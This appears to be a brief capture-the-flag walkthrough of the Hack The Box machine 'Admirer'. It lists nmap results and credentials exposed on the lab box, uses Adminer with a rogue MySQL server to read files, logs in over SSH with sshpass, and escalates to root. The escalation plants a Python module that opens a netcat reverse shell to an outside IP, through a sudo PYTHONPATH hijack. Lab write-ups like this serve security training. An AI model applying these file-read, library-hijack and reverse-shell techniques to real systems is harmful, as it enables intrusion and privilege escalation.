### Nmap
```text
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a71e92163699dcbdd84021a2397e1b9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaQHjxkc8zeXPgI5C7066uFJaB6EjvTGDEwbfl0cwM95npP9G8icv1F/YQgKxqqcGzl+pVaAybRnQxiZkrZHbnJlMzUzNTxxI5cy+7W0dRZN4VH4YjkXFrZRw6dx/5L1wP4qLtdQ0tLHmgzwJZO+111mrAGXMt0G+SCnQ30U7vp95EtIC0gbiGDx0dDVgMeg43+LkzWG+Nj+mQ5KCQBjDLFaZXwCp5Pqfrpf3AmERjoFHIE8Df4QO3lKT9Ov1HWcnfFuqSH/pl5+m83ecQGS1uxAaokNfn9Nkg12dZP1JSk+Tt28VrpOZDKhVvAQhXWONMTyuRJmVg/hnrSfxTwbM9
|   256 c595b6214d46a425557a873e19a8e702 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNHgxoAB6NHTQnBo+/MqdfMsEet9jVzP94okTOAWWMpWkWkT+X4EEWRzlxZKwb/dnt99LS8WNZkR0P9HQxMcIII=
|   256 d02dddd05c42f87b315abe57c4a9a756 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqp21lADoWZ+184z0m9zCpORbmmngq+h498H9JVf7kP
80/tcp open  http    syn-ack Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-title: Admirer
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

### Port80
```text
# http://admirer.htb/robots.txt
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
--------

# http://10.10.10.187/admin-dir/contacts.txt
# admins
Penny
Email: p.wise@admirer.htb


# developers 
Rajesh
Email: r.nayyar@admirer.htb

Amy
Email: a.bialik@admirer.htb

Leonard
Email: l.galecki@admirer.htb

# designers
Howard
Email: h.helberg@admirer.htb

Bernadette
Email: b.rauch@admirer.htb
------

# http://admirer.htb/admin-dir/credentials.txt
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!

# db_admin.php
$servername = "localhost";
$username = "waldo";
$password = "Wh3r3_1s_w4ld0?";

# index.php
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
$dbname = "admirerdb";



# http://admirer.htb/utility-scripts/admin_tasks.php


# http://admirer.htb/utility-scripts/adminer.php - login

```

### Exploit
```bash
# create access for admirer login through login page
GRANT ALL PRIVILEGES ON *.* TO 'admirer'@10.10.10.187 IDENTIFIED BY 'password';

# modify bind addr
sudo nano /etc/mysql/mariadb.conf.d/50-server.cnf 
sudo service mysqld restart

# login with admirer:password

# include file from server
LOCAL INFILE '/var/www/html/index.php'   
INTO TABLE evil.evil
FIELDS TERMINATED BY "\n"

# reveral real cred from index.php
$servername = "localhost";                                                                              |
$username = "waldo";                                                                                   |
$password = "&<h5b~yK3F#{PaPB&dA}{H>";                                                                  |
$dbname = "admirerdb"; 

# login waldo
sshpass -p '&<h5b~yK3F#{PaPB&dA}{H>' ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" waldo@$IP
```

### Priv Esc
```bash
sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh

# looking writable dir
find / -type d -writable 2>/dev/null | grep -v -e '^/proc' -e '/run'

# make evil shutil.py (admin_task invoke it) then we can inject python path and run out shell as root
import os
def make_archive(a, b, c):
    os.system('nc -nv 10.10.14.8 443 -e /bin/bash')

# run script as root and trigger evil python file
sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh 6

```
